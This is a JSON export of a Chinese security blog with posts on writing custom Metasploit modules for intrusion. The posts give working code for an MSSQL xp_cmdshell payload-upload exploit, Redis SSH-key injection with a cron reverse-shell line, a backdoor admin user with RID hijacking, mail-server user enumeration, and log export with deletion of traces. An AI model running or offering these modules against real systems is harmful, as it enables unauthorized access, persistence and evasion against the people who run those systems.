{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"标签","date":"2020-08-21T02:10:57.906Z","updated":"2019-12-04T13:50:11.000Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-08-21T02:10:57.903Z","updated":"2019-12-04T13:50:02.000Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-08-21T02:10:57.902Z","updated":"2020-01-09T05:48:19.000Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"1234ID：AnonySec不甘在奋斗的年纪选择安逸，记录这一路的成长历程。———— Hang&#39;Day2019.12.5 凌晨"}],"posts":[{"title":"打造定制化的Metasploit—安全日志分析","slug":"打造定制化的Metasploit—安全日志分析","date":"2020-07-05T17:56:32.000Z","updated":"2021-01-27T05:40:25.587Z","comments":true,"path":"2020/0706/create-customized-metasploitsecurity-log-analysis.html","link":"","permalink":"https://payloads.cn/2020/0706/create-customized-metasploitsecurity-log-analysis.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言对于Windows安全日志的分析，可以判断出哪些IP对该主机进行登录过。当然，这也可以作为内网横向的目标之一。通过PowerShell就可以完成此操作，但用Metasploit如何实现内存执行ps1呢? EventLog.ps1首先简单解读下EventLog.ps1：它使用WEVTUtil+PowerShell将外部日志导出csv，此种方法优点就是快，需要导入外部evtx。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Param ( [string]$evtx = $pwd.Path+&quot;\\*_Security.evtx&quot;)$time=Get-Date -Format h:mm:ss$evtx=(Get-Item $evtx).fullname$outfile=&quot;C:\\Windows\\Temp\\&quot;+(Get-Item $evtx).BaseName+&quot;.csv&quot;$logsize=[int]((Get-Item $evtx).length/1MB)write-host [+] $time Load $evtx &quot;(&quot;Size: $logsize MB&quot;)&quot; ... -ForegroundColor Green[xml]$xmldoc=WEVTUtil qe $evtx /q:&quot;*[System[Provider[@Name=&#x27;Microsoft-Windows-Security-Auditing&#x27;] and (EventID=4624 or EventID=4625)] and EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;3&#x27;] or EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;]]&quot; /e:root /f:Xml /lf$xmlEvent=$xmldoc.root.Eventfunction OneEventToDict &#123; Param ( $event ) $ret = @&#123; &quot;SystemTime&quot; = $event.System.TimeCreated.SystemTime | Convert-DateTimeFormat -OutputFormat &#x27;yyyy&quot;/&quot;MM&quot;/&quot;dd HH:mm:ss&#x27;; &quot;EventID&quot; = $event.System.EventID &#125; $data=$event.EventData.Data for ($i=0; $i -lt $data.Count; $i++)&#123; $ret.Add($data[$i].name, $data[$i].&#x27;#text&#x27;) &#125; return $ret&#125;filter Convert-DateTimeFormat&#123; Param($OutputFormat=&#x27;yyyy-MM-dd HH:mm:ss fff&#x27;) try &#123; ([DateTime]$_).ToString($OutputFormat) &#125; catch &#123;&#125;&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Extract XML ... -ForegroundColor Green[System.Collections.ArrayList]$results = New-Object System.Collections.ArrayList($null)for ($i=0; $i -lt $xmlEvent.Count; $i++)&#123; $event = $xmlEvent[$i] $datas = OneEventToDict $event $results.Add((New-Object PSObject -Property $datas))|out-null&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Dump into CSV: $outfile ... -ForegroundColor Green$results | Select-Object SystemTime,IpAddress,TargetDomainName,TargetUserName,EventID,LogonType | Export-Csv $outfile -NoTypeInformation -UseCulture -Encoding Default -Force EventID=4624 成功登录EventID=4625 失败登录Logon type 3 Network 网络登录Logon Type 10 RemoteInteractive 远程登录 借助EventLog.ps1，接下来开始编写Metasploit模块。 执行命令先要导出安全日志，就需要远程执行系统命令，这里使用meterpreter中的execute，并创建随机名字导出。 1234567# 随机字母数字8位sec = Rex::Text.rand_text_alphanumeric(8)print_good(&quot;#&#123;sec&#125;&quot;)# lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb# wevtutil.exe管理员权限运行session.sys.process.execute(&quot;wevtutil.exe epl Security C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;) 载入ps1原本想将EventLog.ps1写在该模块中，之后读取写入在目标机中，再去执行。但.ps1格式需要调整，比较麻烦。 换个思路，本地载入读取。经几番查阅，Metasploit可以内存加载，这样就不需要将脚本上传到目标机中，但需要将EventLog.ps1提前放在/data/post/powershell/EventLog.ps1目录下。(可自定义) 123456789101112131415command = &quot;C:\\\\Windows\\\\Temp\\\\&quot; + &quot;#&#123;sec&#125;.evtx&quot;def execute_eventlog_script(command) print_good(&quot;Start Execute EventLog Script ...&quot;) # /data/post/powershell/EventLog.ps1 psh_script = File.read(File.join(Msf::Config.data_directory, &quot;post&quot;, &quot;powershell&quot;, &quot;EventLog.ps1&quot;)) # 压缩脚本 compressed_script = compress_script(psh_script) + command # print_status(&quot;#&#123;compressed_script&#125;&quot;) cmd_out, runnings_pids, open_channels = execute_script(compressed_script) while(log = cmd_out.channel.read) print (&quot;#&#123;log&#125;&quot;) endend 注：因是内存加载，目标机不需要开启运行ps1脚本。 不要忘记载入Powershell类。 1include Msf::Post::Windows::Powershell 文件操作既然安全日志已经被分析完成了，那就需要将分析结果取回本地，并将遗留在目标中的文件进行删除，这里使用meterpreter中的download与rm。 123456dir = Msf::Config.loot_directory# lib/rex/post/meterpreter/extensions/stdapi/fs/file.rbsession.fs.file.download_file(&quot;#&#123;dir&#125;/#&#123;rhost&#125;-Security.csv&quot;,&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;) 完整模块运行Demo： References Metasploit API Metasploit WIKI Outlook.rb","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—邮服用户枚举","slug":"打造定制化的Metasploit—邮服用户枚举","date":"2020-07-03T15:52:26.000Z","updated":"2021-01-27T05:21:17.619Z","comments":true,"path":"2020/0703/create-customized-metasploit—enumeration-of-mail-service-users.html","link":"","permalink":"https://payloads.cn/2020/0703/create-customized-metasploit%E2%80%94enumeration-of-mail-service-users.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言本文开始学习Metasploit Web类模块开发，从HTTPClient类的了解，到Http数据包的Get与Post请求发送，从而实现模拟发包，最终到实现某邮服接口枚举用户的功能模块。 HTTPClientHttpClient mixin是发送基本HTTP请求的模块。 Get首先copy下官方的例子，进行发送get请求。 123456789101112131415161718def run uri = target_uri.path res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;admin&#x27;, &#x27;index.php&#x27;), &#x27;vars_get&#x27; =&gt; &#123; &#x27;p1&#x27; =&gt; &quot;This is param 1&quot;, &#x27;p2&#x27; =&gt; &quot;This is param 2&quot; &#125; &#125;) if res &amp;&amp; res.code == 200 print_good(&quot;I got a 200, awesome&quot;) else print_error(&quot;No 200, feeling blue&quot;) endend 在发包过程中，可以结合抓包，查看实际发送的Http数据包，也可以直接将Request与Response输出查看。 12print_good (&quot;Request: \\n#&#123;res.request.to_s&#125;&quot;)print_good (&quot;Response: \\n#&#123;res.to_s&#125; \\n&quot;) 完整的Request与ResponseHttp数据包请求。 PostPost请求只需要将&#39;method&#39;=&gt;&#39;POST&#39;，并加上post_data。 1234567post_data = (&quot;username=admin&quot;)res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;POST&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;/index.html&#x27;), &#x27;ctype&#x27; =&gt; &#x27;text/x-json&#x27;, &#x27;data&#x27; =&gt; post_data&#125;) 至此，通过HttpClient mixin，已经实现了Http数据包的Get与Post请求发送。 Module某邮服，可通过用户接口，枚举存在的用户名。接下来要将该利用方式转化为Metasploit的扫描模块。 字典读取首先要探测用户接口是否存在，之后才能继续下面操作。打开用户名字典，进行读取。 12345678910111213141516if res.code.to_s == &#x27;200&#x27; print_status(&quot;Exist username interface, start enumerating ...&quot;) # 数组：用户名行分割 queue = [] File.open(datastore[&#x27;USER_FILE&#x27;]).each_line do |users| queue &lt;&lt; users.strip end print_status (&quot;#&#123;queue&#125;&quot;) while(not queue.empty?) # 删除并获取数组第一个元素 user = queue.shift print_status (&quot;#&#123;user&#125;&quot;) end else print_error(&quot;Exist not username interface&quot;)end 数据处理因请求数据是json格式，所以post_data需要进行转换。 12345data = &#123;&quot;email&quot;:&quot;#&#123;user&#125;&quot;&#125;print_status (&quot;#&#123;data&#125;&quot;)# 转换jsonpost_data = data.to_jsonprint_status (&quot;json: #&#123;post_data&#125;&quot;) 转换前后对比： 因Response返回包是xml格式，所以要进行xml解析。这样，就通过Metasploit实现了该利用模块的Http数据包的发送与接收。 123# 解析xmlxml = res.get_xml_documentprint_good (&quot;Response_xml\\n#&#123;xml&#125;&quot;) 最后将Response_xml中的数据进行处理，并把存在的用户名写入txt文本中。 123456789101112131415161718# 输出文件格式outfile = store_loot( &quot;MailUser&quot;, &quot;text/plain&quot;, rhost, &quot;&quot;) # at查找string元素string = xml.at(&#x27;string&#x27;)# text方法也可以被用作去除所有HTML标签text = string.text# print_status (&quot;#&#123;text&#125;&quot;)if not text.empty? print_good (&quot;#&#123;user&#125; : #&#123;text&#125;&quot;) # 存在用户写入文件 output = file_local_write( outfile ,&quot;#&#123;user&#125; : #&#123;text&#125;&quot;)endprint_status (&quot;OutFile: #&#123;outfile&#125;&quot;) 完整模块运行Demo： References Metasploit Module开发WEB篇 常见的Metasploit模块编码错误 如何使用HTTPClient发送HTTP请求","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—Redis未授权","slug":"打造定制化的Metasploit—Redis未授权","date":"2020-07-03T06:41:21.000Z","updated":"2021-01-27T05:22:10.611Z","comments":true,"path":"2020/0703/.html","link":"","permalink":"https://payloads.cn/2020/0703/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Redis未授权漏洞，是内网横向移动的手法之一，常见的利用方式为SSH公钥写入与Cron计划任务反弹shell。但每次都手动命令执行，绝对影响效率，所以本文将该利用方式转化为Metasploit模块进行检测与利用。 未授权检测检测目标Redis是否存在未授权漏洞，通常是redis-cli -h ip后，输入info检测目标是否有回显信息。 编写Metasploit模块，需要载入Redis扫描类。 1include Msf::Auxiliary::Redis 定义检测方法，进行INFO命令执行，并输出数据回显。 1234def check info_data = redis_command(&#x27;INFO&#x27;) print_good (&quot;#&#123;info_data&#125;&quot;)end 可以看到，第一步已经实现。 但此处需要做个判断，如果INFO命令执行后，数据回显中包含redis_version，再继续执行。否则，结束。 123456if (info_data = redis_command(&#x27;INFO&#x27;)) &amp;&amp; /redis_version:(?&lt;redis_version&gt;\\S+)/ =~ info_data print_warning (&#x27;The Redis is unauthorized&#x27;)else print_error (&#x27;The Redis is not unauthorized&#x27;) returnend SSH公钥写入这是手动执行的命令，需要写入ssh公钥文件内容，才能获取目标系统权限。 1234127.0.0.1:6379&gt; config set dir /root/.ssh/127.0.0.1:6379&gt; config set dbfilename authorized_keys127.0.0.1:6379&gt; set x &quot;\\n\\n\\nssh-rsa xxxxxx root@kali\\n\\n\\n&quot;127.0.0.1:6379&gt; save 如果每次进行ssh公钥查看，再copy，属实麻烦。所以在模块头部添加文件选项。 12345register_options( [ Opt::RPORT(6379), OptPath.new(&#x27;SSHPUB&#x27;, [ true, &#x27;The SSH public key location (absolute path)&#x27;, &#x27;/root/.ssh/id_rsa.pub&#x27; ]) ] 定义ssh公钥写入方法，其中authorized_key参数为ssh公钥文件，读取后写入。 12345678def sshpub redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/root/.ssh/&#x27;) redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dbfilename&#x27;, &#x27;authorized_keys&#x27;) authorized_key = &quot;\\n\\n\\n&quot; + File.read(&quot;#&#123;datastore[&#x27;SSHPUB&#x27;]&#125;&quot;) + &quot;\\n\\n\\n&quot; redis_command(&#x27;SET&#x27;, &#x27;x&#x27;, authorized_key) redis_command(&#x27;SAVE&#x27;) print_good (&#x27;SSH public key was written successfully&#x27;)end Cron计划任务反弹如果目标机中没有/root/.ssh/目录，还有可以使用计划任务反弹Shell。因为是反向连接，所以在目标网中需要找另一台可通讯主机进行NC监听，故提示反弹命令。 1234567(info_data = redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/var/spool/cron/&#x27;)) &amp;&amp; /OK/ =~ info_dataprint_line (&quot;&lt;----------------Please use the Cron GetShell----------------&gt;&quot;)print_line (&quot;set xx &#x27;\\\\n* * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\\n&#x27;&quot;)print_line (&quot;config set dir /var/spool/cron/&quot;)print_line (&quot;config set dbfilename root&quot;)print_line (&quot;save&quot;)print_line (&quot;&lt;-------------------------------------------------------------&gt;&quot;) 完整模块运行Demo： References Metasploit API Metasploit WIKI","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—克隆用户","slug":"打造定制化的Metasploit—克隆用户","date":"2020-03-27T16:56:12.000Z","updated":"2021-01-27T05:18:53.190Z","comments":true,"path":"2020/0328/create-customized-metasploitclone-users.html","link":"","permalink":"https://payloads.cn/2020/0328/create-customized-metasploitclone-users.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言在进行内网横向移动时，可以理解为后渗透过程，如何利用Metasploit打造后渗透模块，如何基于session进行操控？比如: 在当前会话上检查系统权限，或者添加用户等。最终解决实战中的需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。 编写后渗透模块代码头部仅需要在头部添加meterpreter会话的类型，该模块就可以在session上进行操控。 检查会话权限这里编写一个简单的模块，检查当前会话是否具有管理员权限,引用 lib/msf/core/post/windows/priv.rb中的is_admin?函数。 1234567891011def run # 检查会话的特权 print_status(&quot;Checking for SYSTEM privileges on session&quot;) admin_check = is_admin? if(admin_check) print_good(&quot;\\tCurrent User Is Admin&quot;) else print_error(&quot;\\tCurrent User is Not Admin&quot;) endend 如果说权限不足，可以在当前session尝试提权，同时也是引用priv.rb。在Module options中可增加模块选项，进行设置。 1234register_options( [ OptBool.new(&#x27;GETSYSTEM&#x27;, [true, &#x27;Attempt to get SYSTEM privilege on the target host.&#x27;, false]), ]) 当getsystem为true时，运行如下定义： 12345678def getsystem results = session.priv.getsystem if results[0] return true else return false endend run主函数也可使用is_system?，对当前会话的系统权限检查。 12345678910111213141516171819202122232425def run # 检查操作系统版本 wver = sysinfo[&quot;OS&quot;] print_status(&quot;Target OS: #&#123;wver&#125;&quot;) # 检查会话的特权，并在需要时尝试获得系统特权。 print_status(&quot;Checking for SYSTEM privileges on session&quot;) if !is_system? if datastore[&#x27;GETSYSTEM&#x27;] print_status(&quot;Trying to get SYSTEM privileges&quot;) if getsystem print_good(&quot;\\tGet SYSTEM privileges&quot;) else print_error(&quot;Could not obtain SYSTEM privileges&quot;) return end else print_error(&quot;Session is not running with SYSTEM privileges. Try setting GETSYSTEM &quot;) return end else print_good(&quot;\\tSession is already running with SYSTEM privileges&quot;) end return nilend 检查当前会话权限与尝试提权的完整Demo： 添加用户以上一个简单的Demo已经实现了当前会话的权限检查，之后编写利用当前session创建用户，并且在未设置密码时，可随机设置8位密码，增加一些复杂度。 123456789101112131415161718def add_users if datastore[&#x27;PASSWORD&#x27;].nil? # 创建随机8位密码 datastore[&#x27;PASSWORD&#x27;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2) print_status(&quot;You have not set up a PASSWORD. The default is &#x27;#&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&#x27;&quot;) end # 添加用户 if enum_user.include? datastore[&#x27;USERNAME&#x27;] print_error(&quot;User &#x27;#&#123;datastore[&#x27;USERNAME&#x27;]&#125;&#x27; already exists.&quot;) else result = add_user(datastore[&#x27;USERNAME&#x27;], datastore[&#x27;PASSWORD&#x27;]) if result[&#x27;return&#x27;] == 0 print_good &quot;\\tAdding User: #&#123;datastore[&#x27;USERNAME&#x27;]&#125; with Password: #&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&quot; else check_result(result) end endend 添加管理员与远程桌面组创建完用户后，还需要将该用户添加管理员组，使该用户有更高的权限。并且在远程桌面时，可能也需要添加至远程桌面组。 该定义引用了post/windows/manage/enable_rdp部分代码。 克隆用户这段代码的定义实际应用了Windows RID劫持技术，在实战中应用的更多的是Clone.exe，其原理大同小异。 Metasploit中的post/windows/manage/rid_hijack模块正是利用RID劫持技术实现了这一点。 最后，将以上讲述的代码与rid_hijack模块结合，便解决了文章开篇提出的实战需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。 References Metasploit API Metasploit WIKI RID Hijacking on Windows","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—MSSQL重构","slug":"打造定制化的Metasploit—MSSQL重构","date":"2020-03-24T11:05:08.000Z","updated":"2021-01-27T05:21:44.974Z","comments":true,"path":"2020/0324/create-customized-metasploit—mssql-refactoring.html","link":"","permalink":"https://payloads.cn/2020/0324/create-customized-metasploit%E2%80%94mssql-refactoring.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言在进行内网渗透时，有时会遇到SQL Server数据库，当获取到正确口令信息时，经常会用到SQLTOOLS一类的渗透工具，但依赖xp_cmdshell需要开启，才能执行系统命令。这里就联想到实战中的需求，也正是本文要讲述的方法：**利用Metasploit，通过正确的SQL Server口令信息，可启用xp_cmdshell，并获取目标系统session**。 参数msftidy使用Metasploit中名为msftidy的内置工具，检查开发的模块语法是否正确。 loadpathMetasploit每次更新，所有模块都会被删除，创建外部目录不被删除（虚拟分支）: 外部目录要与msf目录结构相同，之后在msf中使用loadpath 绝对路径/Metasploit/载入。 当前msf适用，退出后需要重新加载loadpath reload在不关闭metasploit的情况下使用reload命令重新载入编辑过的模块。 内置模块测试Metasploit中内置了mssql_payload模块，但攻击效果不是很好，session弹不回来。 编写mssql_powershell模块mssql_powershell是在mssql_payload基础上进行修改的。 接下来进行分解讲述： 代码头部1234567891011121314151617181920212223242526272829303132### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;msf/core&#x27; # 引用 core 核心库class MetasploitModule &lt; Msf::Exploit::Remote # 定义这是一个远程攻击模块 Rank = ExcellentRanking include Msf::Exploit::Remote::MSSQL # 包含 lib/msf/core/exploit/mssql.rb 库 def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;Microsoft SQL Server Powershell payload &#x27;, # %q 单引号字符串 &#x27;Description&#x27; =&gt; %q&#123; This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;AnonySec@DropLab&#x27;, ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;Platform&#x27; =&gt; &#x27;win&#x27;, # 仅支持windows平台 &#x27;Arch&#x27; =&gt; [ ARCH_X86, ARCH_X64 ], &#x27;Targets&#x27; =&gt; [ [ &#x27;Automatic&#x27;, &#123; &#125; ], ], &#x27;DefaultTarget&#x27; =&gt; 0, )) 基本选项 Boolean 布尔选项类型 https://rapid7.github.io/metasploit-framework/api/Msf/OptBool.html Required (参数是否为必填项) “false” Current Setting (当前的设置) “true” 即默认使用 PowerShell 1234register_options( [ OptBool.new(&#x27;UsePowerShell&#x27;, [ true, &quot;Use Powershell as payload delivery method instead&quot;,true ]) ]) 检查目标是否存在漏洞可被利用1234567891011121314151617def check if !mssql_login_datastore vprint_status(&quot;Invalid SQL Server credentials&quot;) return Exploit::CheckCode::Detected end # 查询mssql版本 mssql_query(&quot;select @@version&quot;, true) if mssql_is_sysadmin vprint_good &quot;User #&#123;datastore[&#x27;USERNAME&#x27;]&#125; is a sysadmin&quot; Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end ensure disconnect end 启用xpcmdshell先以SQLTOOLS工具尝试 回到代码中，引用mssql.rb中的mssql_xpcmdshell方法 123def run mssql_xpcmdshell(datastore[&#x27;CMD&#x27;], true) if mssql_login_datastoreend 定义主体代码定义upload_powershell_exec主要函数，exe是从下面Msf::Util::EXE.to_win32pe(framework,payload.encoded)发过来的二进制文件 1def upload_powershell_exec(exe, debug=false) 调试状态下debug=true的输出 十六进制转换，创建随机文件名，输出状态 123456# 十六进制转换，“H:打开二进制格式的文件，以十六进制转换“hex = exe.unpack(&quot;H*&quot;)[0]# 创建随机8位字母的文件名var_payload = rand_text_alpha(8)# payload保留在目标系统 C:\\Windows\\\\Temp\\ 目录下print_status(&quot;Warning: This module will leave #&#123;var_payload&#125;.exe in the SQL Server C:\\\\Windows\\\\Temp\\\\ directory&quot;) 通过powershell创建一个从十六进制至二进制的转换：$s变量中的 `r 与 `n替换空字符，去除回车换行符，由于MSSQL存在一个字符长度限制，需要将十六进制的payload分成500字节分块，payload被分到多个请求中，传到目标系统中就会被添加回车换行符。如不去除，生成的二进制文件将损坏，就不能执行；通过[Convert]::ToByte 让powershell将十六进制的文件写入到 #&#123;var_payload&#125;.exe 二进制程序中 1h2b = &quot;$s = gc &#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&#x27;;$s = [string]::Join(&#x27;&#x27;, $s);$s = $s.Replace(&#x27;`r&#x27;,&#x27;&#x27;); $s = $s.Replace(&#x27;`n&#x27;,&#x27;&#x27;);$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %&#123;$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)&#125;;[IO.File]::WriteAllBytes(&#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&#x27;,$b)&quot; 转换编码，输出状态 123456# 将h2b字符串转换为Unicode编码h2b_unicode=Rex::Text.to_unicode(h2b)# 将Unicode字符串进行base64编码h2b_encoded = Rex::Text.encode_base64(h2b_unicode)# 输出状态，正在上传payloadprint_status(&quot;Uploading the payload #&#123;var_payload&#125;, please be patient...&quot;) 计数器idx每次增长cnt(500)个字节。简单说：读取500字节，发送，再读取，再发送，直到读到文件末尾。 12345678# 基础计数器idx最初位置为0，标识文件末尾idx = 0# 每次发送十六进制文件到操作系统时递增500字节。cnt = 500while(idx &lt; hex.length - 1) mssql_xpcmdshell(&quot;cmd.exe /c echo #&#123;hex[idx, cnt]&#125;&gt;&gt;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, false) idx += cntend 利用PowerShell EncodedCommand命令转换payload，之后执行，输出相关状态 123456print_status(&quot;Converting the payload utilizing PowerShell EncodedCommand...&quot;)mssql_xpcmdshell(&quot;powershell -EncodedCommand #&#123;h2b_encoded&#125;&quot;, debug)mssql_xpcmdshell(&quot;cmd.exe /c del C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, debug)print_status(&quot;Executing the payload...&quot;)mssql_xpcmdshell(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&quot;, false, &#123;:timeout =&gt; 1&#125;)print_status(&quot;Be sure to cleanup #&#123;var_payload&#125;.exe...&quot;) 攻击模块的主体代码使用12345678910111213def exploit # 检查是否已经正常登陆 if !mssql_login_datastore # 口令错误无法登陆输出该状态 “[*] xx.xx.xx.xx:1433 - Invalid SQL Server credentials” print_status(&quot;Invalid SQL Server credentials&quot;) return end # UsePowerShell 方法调用 upload_powershell_exec 函数 if (datastore[&#x27;UsePowerShell&#x27;]) # Msf::Util::EXE.to_win32pe(framework,payload,encoded) 自动产生一个可用的二进制payload # https://rapid7.github.io/metasploit-framework/api/Msf/Util/EXE.html#to_win32pe-class_method upload_powershell_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded)) end 处理与目标系统间的连接12handlerdisconnect 完整载入运行1234567msf5 &gt; loadpath /Users/anonysec/Desktop/Metasploit/msf5 &gt; use exploit/windows/mssql/mssql_powershellmsf5 exploit(windows/mssql/mssql_powershell) &gt; set payload windows/meterpreter/bind_tcpmsf5 exploit(windows/mssql/mssql_powershell) &gt; set rhost 192.168.144.212msf5 exploit(windows/mssql/mssql_powershell) &gt; set password Admin123msf5 exploit(windows/mssql/mssql_powershell) &gt; set lport 5353msf5 exploit(windows/mssql/mssql_powershell) &gt; run 注：调试状态下debug=true 小结只要对Metasploit框架有兴趣，并已经查看了现有代码是如何工作的，就可以充分利用现有代码，拿过来改改，并增加一些原创代码这样的流程。在大多数情况下，没必要完全从零开始来编写自己的模块代码。这就是代码重用的能量。 References Metasploit API Metasploit WIKI 《Metasploit: The Penetration Tester’s Guide》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—分析HTTP模块","slug":"打造定制化的Metasploit—分析HTTP模块","date":"2020-03-02T01:11:13.000Z","updated":"2021-01-27T05:18:11.110Z","comments":true,"path":"2020/0302/create-customized-metasploit—analyze-http-module.html","link":"","permalink":"https://payloads.cn/2020/0302/create-customized-metasploit%E2%80%94analyze-http-module.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 分析HTTP扫描模块分析的模块位于/modules/auxiliary/scanner/http/http_version.rb 首先来看模块头的引入与类的定义： 12345678### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;rex/proto/http&#x27; class MetasploitModule &lt; Msf::Auxiliary require &#39;rex/proto/http&#39;表示该模块将要引入这个rex库文件目录下的所有http协议方法，所有的模块都可以被调取使用。包括用于设置连接的函数，get和post的请求和响应处理等。 Msf::Auxiliary定义了该代码的类为辅助模块。 如下为/lib/rex/proto/http目录下的内容： [注：继承有助于重用代码和快速执行，不幸的是，Ruby不支持多继承，但是Ruby支持mixins。mixin就像是多继承的一个特定实现，在多继承中，只有接口部分是可继承的。] 12345# Exploit mixins should be called first(首先调用渗透模块mixins类)include Msf::Exploit::Remote::HttpClientinclude Msf::Auxiliary::WmapScanServer# Scanner mixin should be near last(接着是扫描模块mixins类)include Msf::Auxiliary::Scanner 上面代码所必需库文件中涵盖了编写模块所需要的所有方法，这些库文件的详细信息如下： 语句 引入路径 用途 Msf::Exploit::Remote::HttpClient /lib/msf/core/exploit/http/client.rb 这个库文件提供了大量方法，例如连接到目标计算机、发送请求、切断与客户端的连接等。 Msf::Auxiliary::WmapScanServer /lib/msf/core/auxiliary/wmapmodule.rb wmap是一款基于Metasploit的通用Web应用程序扫描框架，有助于完成Metasploit的Web渗透测试。 Msf::Auxiliary::Scanner /lib/msf/core/auxiliary/scanner.rb 这个文件包含了基于扫描模块的所有函数，提供了模块运行、模块初始化、扫描进度等各种方法。 这个initialize方法是Ruby编程语言中的默认构造方法。它定义了名称Name、描述Description、作者Author、许可License等。许可就是&#39;License&#39; =&gt; MSF_LICENSE，最后用一个end结束。 12345678910111213def initialize super( &#x27;Name&#x27; =&gt; &#x27;HTTP Version Detection&#x27;, &#x27;Description&#x27; =&gt; &#x27;Display version information about each system.&#x27;, &#x27;Author&#x27; =&gt; &#x27;hdm&#x27;, &#x27;License&#x27; =&gt; MSF_LICENSE ) register_wmap_options(&#123; &#x27;OrderID&#x27; =&gt; 0, &#x27;Require&#x27; =&gt; &#123;&#125;, &#125;) end 最后这段代码才是真正干活做事的： 123456789101112def run_host(ip) begin connect res = send_request_raw(&#123; &#x27;uri&#x27; =&gt; &#x27;/&#x27;, &#x27;method&#x27; =&gt; &#x27;GET&#x27; &#125;) fp = http_fingerprint(:response =&gt; res) print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp report_service(:host =&gt; rhost, :port =&gt; rport, :sname =&gt; (ssl ? &#x27;https&#x27; : &#x27;http&#x27;), :info =&gt; fp) rescue ::Timeout::Error, ::Errno::EPIPE ensure disconnect end end 先来解释下在本段代码中所使用的重要函数： 函数 引入库文件 用途 run_host /lib/msf/core/auxiliary/scanner.rb 使用IP与所需主机建立连接 connect /lib/msf/core/exploit/http/client.rb 与目标服务器建立一个HTTP类型的连接 send_request_raw /lib/msf/core/exploit/http/client.rb 用来向目标发送原始的HTTP请求 http_fingerprint /lib/msf/core/exploit/http/client.rb 